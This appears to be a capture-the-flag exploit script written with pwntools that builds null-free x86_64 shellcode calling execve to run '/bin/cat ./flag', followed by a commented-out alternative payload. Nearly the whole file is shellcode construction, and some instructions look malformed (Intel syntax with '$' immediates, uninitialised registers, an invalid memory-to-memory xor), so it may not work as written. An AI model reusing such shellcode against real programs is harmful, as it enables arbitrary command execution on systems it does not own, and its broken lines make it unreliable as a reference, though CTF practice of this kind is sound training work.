from pwn import *

context.arch = 'x86_64'

cat_str = int.from_bytes(b'/bin/cat', 'big')
flag_str = int.from_bytes(b'./flag', 'big')
print(hex(flag_str))


# execl("/bin/cat", "/bin/cat", "./flag")
# shell = shellcraft.execve("/bin/cat", ["cat", "./flag"], 0)
shell = """
    /* execve(path='/bin/cat', argv=['cat', './flag'], envp=0) */
    /* push b'/bin/cat\x00' */
    push 1
    dec byte ptr [rsp]
    add rax, 8386093036507587119
    push rax
    add rdi, rsp
    /* push argument array ['cat\x00', './flag\x00'] */
    /* push b'cat\x00./flag\x00' */
    push 0x1010101 ^ 0x6761
    xor dword ptr [rsp], 0x1010101
    xor rax, rax
    add rax, $0x101010101010101
    push rax
    xor rax, rax
    add rax, $0x6d672e2f01756062
    xor [rsp], rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 0xc
    pop rsi
    add rsi, rsp
    push rsi /* './flag\x00' */
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi /* 'cat\x00' */
    xor rsi, rsi
    add rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
"""

print(asm(shell))

# payload = asm('sub rsp, 0x18')
# payload += asm(f'mov (rsp), {hex(cat_str)}')
# payload += asm(f'mov 8(rsp), {hex(flag_str)}')
# payload += asm('xor 16(rsp), 16(rsp)')
# payload += asm('mov rdi, 0x3b')
# payload += asm('mov rsi, rsp')
# payload += asm('xor rdx, rdx')
# payload += asm('syscall')
